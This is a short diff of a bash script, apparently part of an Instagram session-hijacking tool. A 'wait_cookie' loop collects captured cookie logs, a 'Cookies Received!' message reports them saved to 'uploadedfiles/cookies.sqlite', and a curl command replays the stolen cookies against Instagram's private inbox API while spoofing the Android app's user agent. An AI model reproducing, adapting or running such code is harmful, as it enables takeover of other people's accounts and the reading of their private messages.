@@ -55,8 +55,7 @@ infoinsta() {
 
 
 
-
-curl -b insta_cookies.txt -H 'X-CSRFToken:'$csrftoken'' -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -L https://i.instagram.com/api/v1/news/inbox/?
+curl -b insta_cookies.txt  -H 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"'  -L https://i.instagram.com/api/v1/news/inbox/?
 
 
 exit 1
@@ -88,7 +87,7 @@ wait_cookie() {
 
 while [ true ]; do
 if [[ -e Log.log ]]; then
-printf "\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Cookie Received!\e[0m\n"
+printf "\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Cookies Received! [Saved: uploadedfiles/cookies.sqlite\e[0m\n"
 cat Log.log >> log.backup
 rm -rf Log.log
 manage_cookie
